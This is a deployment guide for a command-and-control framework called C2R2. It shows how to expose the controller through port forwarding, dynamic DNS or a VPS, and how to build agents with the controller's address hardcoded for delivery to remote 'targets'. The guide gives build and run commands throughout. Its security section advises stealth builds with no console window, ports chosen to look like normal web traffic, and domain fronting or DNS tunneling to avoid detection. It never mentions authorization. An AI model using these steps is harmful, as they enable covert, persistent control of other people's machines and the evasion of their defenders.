# Network Deployment Guide

## 📋 Overview

This guide explains how to deploy C2R2 server and agents across different network scenarios, including:
- Local network (LAN) deployment
- Internet deployment with port forwarding
- Dynamic DNS configuration
- Troubleshooting connection issues

---

## 🌐 Deployment Scenarios

### Scenario 1: Local Network (LAN)

**Use Case**: Testing or internal network deployment where both server and agent are on the same local network.

#### Server Configuration

```bash
# Start server binding to all interfaces
cd c2r2-server
./target/release/c2r2-server --bind 0.0.0.0 --port 4444
```

**Note**: The `--bind 0.0.0.0` flag is crucial - it tells the server to listen on all network interfaces, not just localhost.

#### Agent Configuration

Find your server's local IP address:

```bash
# On Linux (Raspberry Pi, Kali, etc.)
ip addr show | grep "inet " | grep -v 127.0.0.1

# On Windows
ipconfig
```

Build the agent with your server's LAN IP:

```bash
cd builder
cargo run --release -- build-agent \
  --name agent-lan \
  --server "192.168.1.100:4444"
```

Replace `192.168.1.100` with your actual LAN IP address.

---

### Scenario 2: Internet Deployment (Port Forwarding)

**Use Case**: Server on home network (e.g., Raspberry Pi) accessible from the internet, agent deployed on external targets.

#### Prerequisites

1. **Static/Dynamic IP**: Know your public IP address
   ```bash
   # Check your public IP
   curl ifconfig.me
   # or
   curl icanhazip.com
   ```

2. **Router Access**: Administrative access to configure port forwarding

3. **Firewall Rules**: Ability to configure firewall on the server

#### Step 1: Configure Router Port Forwarding

Access your router's admin panel (usually at `192.168.1.1` or `192.168.0.1`) and create a port forwarding rule:

```
Protocol: TCP
External Port: 4444
Internal IP: <Raspberry Pi LAN IP> (e.g., 192.168.1.100)
Internal Port: 4444
```

**Example configurations for common routers:**

**TP-Link:**
- Forwarding → Virtual Servers
- Add new entry with TCP port 4444

**Netgear:**
- Advanced → Port Forwarding
- Add custom service with TCP 4444

**Asus:**
- WAN → Virtual Server / Port Forwarding
- Add TCP port 4444

#### Step 2: Configure Firewall on Server

On your Raspberry Pi or Linux server:

```bash
# Using ufw (Ubuntu/Debian)
sudo ufw allow 4444/tcp
sudo ufw reload

# Using firewalld (CentOS/RHEL)
sudo firewall-cmd --permanent --add-port=4444/tcp
sudo firewall-cmd --reload

# Using iptables (manual)
sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
sudo iptables-save > /etc/iptables/rules.v4
```

#### Step 3: Start Server

```bash
cd c2r2-server
./target/release/c2r2-server --bind 0.0.0.0 --port 4444
```

**Critical**: Use `--bind 0.0.0.0` to accept external connections. **Do not** use `localhost` or `127.0.0.1`.

#### Step 4: Test Port Forwarding

Before building the agent, verify port forwarding works:

```bash
# From an external machine (not on your LAN)
nc -zv <YOUR_PUBLIC_IP> 4444

# Or use online port checker:
# https://www.yougetsignal.com/tools/open-ports/
# Enter your public IP and port 4444
```

Expected output:
```
Connection to <YOUR_PUBLIC_IP> 4444 port [tcp/*] succeeded!
```

#### Step 5: Build Agent with Public IP

```bash
cd builder
cargo run --release -- build-agent \
  --name agent-internet \
  --server "<YOUR_PUBLIC_IP>:4444" \
  --production
```

**Important**: Use your **public IP address**, not your local LAN IP!

#### Step 6: Deploy and Test

1. Transfer `agent-internet.exe` to target system
2. Execute the agent
3. Monitor server console for incoming connection

---

### Scenario 3: Dynamic DNS

**Use Case**: Home internet connection with dynamic public IP that changes frequently.

#### Step 1: Set Up Dynamic DNS

Choose a Dynamic DNS provider:
- **No-IP** (noip.com) - Free tier available
- **DuckDNS** (duckdns.org) - Free
- **Dynu** (dynu.com) - Free

Create a hostname (e.g., `myc2server.ddns.net`)

#### Step 2: Configure DDNS Client

On your Raspberry Pi:

```bash
# Install ddclient
sudo apt update
sudo apt install ddclient

# Configure for your provider
sudo nano /etc/ddclient.conf
```

Example configuration for No-IP:
```
protocol=noip
use=web
server=dynupdate.no-ip.com
login=your-email@example.com
password='your-password'
myc2server.ddns.net
```

Start the service:
```bash
sudo systemctl enable ddclient
sudo systemctl start ddclient
```

#### Step 3: Build Agent with DDNS Hostname

```bash
cd builder
cargo run --release -- build-agent \
  --name agent-ddns \
  --server "myc2server.ddns.net:4444" \
  --production
```

---

## 🔧 Troubleshooting

### Problem: Agent Cannot Connect to Server

#### Symptom
Agent runs but server shows no incoming connection.

#### Diagnostic Steps

**1. Verify server is running and listening**

```bash
# On the server
sudo netstat -tlnp | grep 4444
# Should show: tcp 0 0 0.0.0.0:4444 0.0.0.0:* LISTEN <PID>/c2r2-server

# Or with ss
sudo ss -tlnp | grep 4444
```

If you see `127.0.0.1:4444` instead of `0.0.0.0:4444`, the server is only listening on localhost. Restart with `--bind 0.0.0.0`.

**2. Test local connectivity**

On the server itself:
```bash
nc -zv localhost 4444
# Should succeed
```

**3. Test LAN connectivity**

From another device on the same network:
```bash
nc -zv 192.168.1.100 4444
# Replace with your server's LAN IP
```

If this fails:
- Check firewall rules on the server
- Verify the LAN IP is correct

**4. Test WAN connectivity**

From an external network (use your phone's data or a VPS):
```bash
nc -zv <YOUR_PUBLIC_IP> 4444
```

If this fails but LAN works:
- Port forwarding not configured correctly
- ISP may be blocking the port (some ISPs block common ports)
- Router firewall blocking incoming connections

**5. Check agent configuration**

The agent is built with the server address hardcoded. Verify it was built with the correct address:

```bash
# On Linux, you can check with strings
strings agent.exe | grep -A 2 -B 2 "C2_SERVER"

# Should show the IP:port you specified during build
```

#### Common Solutions

**Server shows `127.0.0.1:4444` instead of `0.0.0.0:4444`**
```bash
# Solution: Restart server with correct bind address
./c2r2-server --bind 0.0.0.0 --port 4444
```

**Port test fails from WAN**
```bash
# Solution 1: Verify port forwarding
# Log into router, check port forwarding rule is:
# - External port: 4444
# - Internal IP: <server LAN IP>
# - Internal port: 4444
# - Protocol: TCP

# Solution 2: Check if ISP blocks port 4444
# Try a different port (e.g., 8443, 8080, 443)
./c2r2-server --bind 0.0.0.0 --port 8443
# Remember to update port forwarding and rebuild agent
```

**Agent built with wrong server address**
```bash
# Solution: Rebuild the agent with correct address
cd builder
cargo run --release -- build-agent \
  --name agent-fixed \
  --server "<CORRECT_IP>:4444" \
  --production
```

---

### Problem: Connection Works but Agent Doesn't Stay Connected

#### Symptom
Agent connects briefly then disconnects, or connection is unstable.

#### Possible Causes

**1. NAT timeout**

Home routers may close idle connections after 30-60 seconds. The agent's beacon system should prevent this, but if your router is aggressive:

**Solution**: Configure beacon with shorter intervals
```bash
# On the C2 server, when agent connects:
C2R2 [1]> /beacon 30:20
# 30 seconds with ±20% jitter (24-36 seconds)
```

**2. Firewall interference**

Some firewalls inspect TCP connections and may drop suspicious traffic.

**Solution**: Use a different port that appears more legitimate:
- Port 443 (HTTPS)
- Port 8443 (alternative HTTPS)
- Port 80 (HTTP)

**3. Network instability**

Poor internet connection on either side.

**Solution**: The agent will automatically reconnect. Check logs for reconnection attempts.

---

### Problem: Server Behind CGNAT

#### Symptom
Port forwarding configured correctly but still cannot connect from internet.

#### Diagnosis

Check if you're behind CGNAT (Carrier-Grade NAT):

```bash
# On server, get your router's WAN IP
curl ifconfig.me

# Compare with your router's reported WAN IP
# If they're different, you're likely behind CGNAT
```

#### Solutions

**Option 1: Request Public IP from ISP**
Contact your ISP and request a public IP address (may cost extra).

**Option 2: Use VPN/Tunnel**
- Use ngrok: `ngrok tcp 4444`
- Use Cloudflare Tunnel
- Use Tailscale or WireGuard

**Option 3: Use VPS as Relay**
Deploy server on a VPS with public IP instead of Raspberry Pi.

---

## 📝 Configuration Checklist

Before deploying over internet, verify:

- [ ] Server is running with `--bind 0.0.0.0`
- [ ] Port 4444 (or custom port) is open in server firewall
- [ ] Router port forwarding is configured
  - [ ] External port matches internal port
  - [ ] Internal IP matches server's LAN IP
  - [ ] Protocol is TCP
- [ ] Port forwarding tested with `nc` or online checker
- [ ] Agent built with correct public IP/hostname
- [ ] Agent built in production mode (`--production`)
- [ ] Not behind CGNAT (or using tunnel solution)

---

## 🔒 Security Considerations

### For Internet Deployments

**1. Use Production Mode**

Always use `--production` when building agents for real deployments:
```bash
cargo run --release -- build-agent \
  --name agent-prod \
  --server "x.x.x.x:4444" \
  --production
```

This ensures:
- No console window
- No debug output
- Maximum stealth

**2. Change Default Port**

Don't use port 4444 for real operations - it's well-known:
```bash
# Use a less obvious port
./c2r2-server --bind 0.0.0.0 --port 8443
```

**3. Consider Additional Security**

For production deployments:
- Use a VPN between server and targets
- Deploy server on a VPS, not home network
- Use domain fronting or DNS tunneling
- Implement additional encryption layers

**4. Monitor Server Logs**

Always check logs for unauthorized access attempts:
```bash
tail -f logs/c2r2-session.log
```

---

## 🧪 Testing Procedure

### Complete Connection Test

```bash
# 1. Start server
cd c2r2-server
./target/release/c2r2-server --bind 0.0.0.0 --port 4444 --verbose

# 2. In another terminal, test local connection
nc -zv localhost 4444

# 3. From another machine on LAN, test LAN connection
nc -zv 192.168.1.100 4444

# 4. From external network (phone data), test WAN connection
nc -zv <PUBLIC_IP> 4444

# 5. If all tests pass, deploy agent
cd builder
cargo run --release -- build-agent \
  --name agent-test \
  --server "<PUBLIC_IP>:4444"

# 6. Execute agent on target
# 7. Monitor server output for connection
```

---

## 📞 Common ISP Issues

### Blocked Ports

Some ISPs block common malware ports including:
- 4444 (msfconsole default)
- 31337 (Back Orifice)
- 6667 (IRC)

**Solution**: Use alternative ports like 8443, 443, or 8080.

### CGNAT

Mobile carriers and some ISPs use CGNAT, making direct connections impossible.

**Solution**: Use a tunnel service or VPS.

### Dynamic IP

Most residential connections have dynamic IPs that change.

**Solution**: Use Dynamic DNS (see Scenario 3 above).

---

## 📚 Examples

### Example 1: Home Lab (Raspberry Pi on LAN)

```bash
# Server: Raspberry Pi at 192.168.1.100
./c2r2-server --bind 0.0.0.0 --port 4444

# Agent: Windows PC on same network
cargo run --release -- build-agent \
  --name lab-agent \
  --server "192.168.1.100:4444"
```

### Example 2: Internet Deployment (Port Forwarding)

```bash
# Server: Raspberry Pi (public IP: 203.0.113.50)
# Port forwarding: 4444 → 192.168.1.100:4444
./c2r2-server --bind 0.0.0.0 --port 4444

# Agent: Remote Windows target
cargo run --release -- build-agent \
  --name remote-agent \
  --server "203.0.113.50:4444" \
  --production
```

### Example 3: VPS Deployment

```bash
# Server: VPS with public IP 198.51.100.75
./c2r2-server --bind 0.0.0.0 --port 8443

# Agent: Any target with internet
cargo run --release -- build-agent \
  --name vps-agent \
  --server "198.51.100.75:8443" \
  --production
```

---

## ❓ FAQ

### Q: Can I use a domain name instead of IP?

**A**: Yes! The agent supports both IP addresses and hostnames:
```bash
cargo run --release -- build-agent \
  --name agent-domain \
  --server "c2.example.com:4444"
```

### Q: What if my public IP changes?

**A**: Use Dynamic DNS (see Scenario 3) or rebuild and redeploy the agent with the new IP.

### Q: Does the agent work through proxies?

**A**: Currently, the agent uses direct TCP connections and doesn't support HTTP proxies. For proxy support, consider deploying server on a VPS accessible from the target network.

### Q: Can I run multiple agents through the same port?

**A**: Yes! The server supports multiple simultaneous agent connections on the same port. Each agent gets a unique ID.

### Q: What's the maximum number of agents?

**A**: The server uses async Tokio and can handle hundreds of concurrent connections, limited only by system resources.

### Q: How do I know if port forwarding is working?

**A**: Use an online port checker before deploying agents:
- https://www.yougetsignal.com/tools/open-ports/
- https://canyouseeme.org/

---

## 📖 Additional Resources

- [Server Configuration](USAGE.md#server-configuration)
- [Agent Building](INSTALLATION.md#building-agents)
- [Security Best Practices](SECURITY.md)
- [Troubleshooting Guide](USAGE.md#troubleshooting)

---

**Last Updated**: November 2024  
**Version**: 2.0
